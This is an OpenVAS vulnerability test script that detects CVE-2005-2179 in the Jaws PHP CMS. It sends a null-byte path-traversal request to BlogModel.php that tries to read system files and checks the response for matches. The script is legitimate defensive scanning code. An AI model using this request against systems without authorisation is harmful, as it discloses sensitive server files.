###############################################################################
# OpenVAS Vulnerability Test
# $Id: jaws_file_inclusion.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# File Inclusion Vulnerability in Jaws
#
# Authors:
# Josh Zlatin-Amishav
# Fixed by Tenable:
#   - added CVE xref
#   - added See also and Solution.
#   - fixed script family.
#   - changed exploit and test of its success.
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19395");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2179");
  script_bugtraq_id(14158);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_name("File Inclusion Vulnerability in Jaws");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.hardened-php.net/advisory-072005.php");

  script_tag(name:"solution", value:"Upgrade to JAWS version 0.5.3 or later.");
  script_tag(name:"summary", value:"The remote host is running JAWS, a content management system written
  in PHP.

  The remote version of Jaws allows an attacker to include URLs
  remotely.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    url = string( dir, "/gadgets/Blog/BlogModel.php?path=/" + file + "%00" );

    req = http_get( item:url, port:port );
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

    if( egrep( string:res, pattern:pattern ) ||
        egrep( string:res, pattern:"Warning: main\(/" + file + ".+failed to open stream" ) || # we got an error suggesting magic_quotes_gpc was enabled but
        egrep( string:res, pattern:"Warning: .+ Failed opening '/" + file + ".+for inclusion" ) ) { # remote URLs might still work.
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );